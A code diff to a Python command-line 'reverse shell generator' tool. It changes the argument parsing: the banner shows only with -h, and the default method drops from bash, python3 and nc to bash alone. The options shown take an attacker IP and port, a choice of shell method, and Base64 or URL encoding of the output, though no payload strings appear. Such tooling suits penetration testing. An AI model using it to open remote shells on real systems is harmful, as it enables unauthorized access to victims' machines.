@@ -15,11 +15,12 @@ asciiart = """
  `-----'  `--' `--'  `------'  `-----'   `-----'   `-----'    `------' `--'  `--'
 
 """
-print(asciiart)
-parser = argparse.ArgumentParser()
+if "-h" in sys.argv:
+  print(asciiart)
+parser = argparse.ArgumentParser(description='Command line reverse shell generator tool')
 parser.add_argument('-i', metavar='<attacker ip>', help='Attacker ip address to receive the connection back from victim machine. Default = 127.0.0.1',default='127.0.0.1')
 parser.add_argument('-p', metavar='<attacker port>', help='Attacker port to listen on. Default = 1337', default='1337')
-parser.add_argument('-m', metavar='method to use', default='bash,python3,nc', help='A comma seperated list of reverse shell methods. Default is bash,python3,nc ')
+parser.add_argument('-m', metavar='method to use', help='A comma seperated list of reverse shell methods. Example -m bash,python3,nc. Default is bash')
 parser.add_argument('-l', action='store_true', help='List available methods for reverse shells')
 parser.add_argument('-b', action='store_true', help='Base64 encode the reverse shell output')
 parser.add_argument('-u', action='store_true', help='Url encode the reverse shell output')
@@ -33,8 +34,12 @@ if args.l:
 
 port = args.p
 ip = args.i
-method_list = args.m.split(",")
 
+if args.m:
+  method_list = args.m.split(",")
+else:
+  print('# No method specified with -m! Using defalt method of bash')
+  method_list = ['bash']
 output = ''
 
 for method in method_list:
